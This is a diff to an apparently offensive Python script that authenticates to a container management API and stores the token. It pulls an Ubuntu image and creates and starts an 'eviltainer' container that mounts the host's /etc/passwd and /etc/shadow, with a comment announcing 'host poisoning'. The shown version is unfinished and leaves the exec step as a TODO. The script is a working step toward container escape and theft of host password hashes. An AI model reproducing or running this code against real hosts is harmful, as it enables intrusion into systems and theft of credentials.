@@ -47,7 +47,7 @@ def main():
 	with open("./data/auth.token", 'w') as token:
 		token.write(a.get_jwt())
 	print("[*] Getting a list of containers...")
-	containers = list_containers()
+	conts = list_containers()
 	print("[+] List of containers successfully retrieved...")
 	print("\n")
 	print("[*] Checking if the evil pwntainer image exists...")
@@ -55,7 +55,18 @@ def main():
 		print("[+] Pwntainer evil image exists")
 	else:
 		print("[-] Evil pwnstainer image not found, fetching...")
+		pull_image("ubuntu:18.04")
+		print("[+]Image pull successful")
 
+	# Start the evil container, mounting the various host filesystems.
+	pwntainer = containers.Containers(sys.argv[1], 1)
+	print("[*] Starting the pwntainer evil container")
+	pwntainer.create_container("eviltainer", ["/etc/passwd:/etc/passwd", "/etc/shadow:/etc/shadow"])
+	print("[+] Evil container created successfully")
+	print("[*] Starting the eviltainer container")
+	pwntainer.start_container()
+	print("[*] Starting host poisoning")
+	# Todo exec on container
 
 
 if __name__=="__main__":
